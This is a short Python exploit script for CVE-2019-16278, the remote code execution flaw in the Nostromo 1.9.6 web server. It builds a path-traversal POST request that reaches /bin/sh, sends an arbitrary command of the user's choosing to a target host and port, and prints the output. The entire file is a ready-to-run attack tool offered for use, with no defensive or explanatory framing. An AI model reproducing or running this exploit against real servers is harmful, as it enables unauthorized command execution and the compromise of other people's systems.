# CVE-2019-16278
# a quick python exploit for the Nostromo 1.9.6 remote code execution vulnerability. 
# simply takes a host and port that the web server is running on, as well as an optional command. 

# just provide an IP/port and the command you want to run and you're good to go. 
# (if command has spaces, put command between "") 

import socket
import argparse
import sys

# i would use sys.argv since this is simple but this way is cleaner
parser = argparse.ArgumentParser(description='Nostromo Remote Code Execution (CVE-2019-16278)')
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
parser.add_argument('cmd',help='command to execute, default is id',default='id',nargs='?')
args = parser.parse_args()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # set up our socket stream

# such a simple payload, you should pay more attention your dirs
payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n" 
payload += "Content-Length: 1\r\n\r\necho\necho\n"
payload += "%s 2>&1" % args.cmd
print("[+] Crafted malicious HTTP request payload.")

print ("[+] Connecting to target..")
try:
    s.connect((args.host , int(args.port)))
except ConnectionRefusedError:
    print("[!] Cannot connect, target actively refused connection.")
    sys.exit(1)

print("[+] Sending malicious payload..\n")
s.sendall(payload.encode('utf-8') )

data = []
while True:
    chunk = s.recv(1024)  #blocks while waiting for data
    if chunk: data.append(chunk.decode("utf-8"))
    # ff the recv() returns a blank string, then the other side
    # closed the socket, and no more data will be sent:
    else: break  

print("".join(data))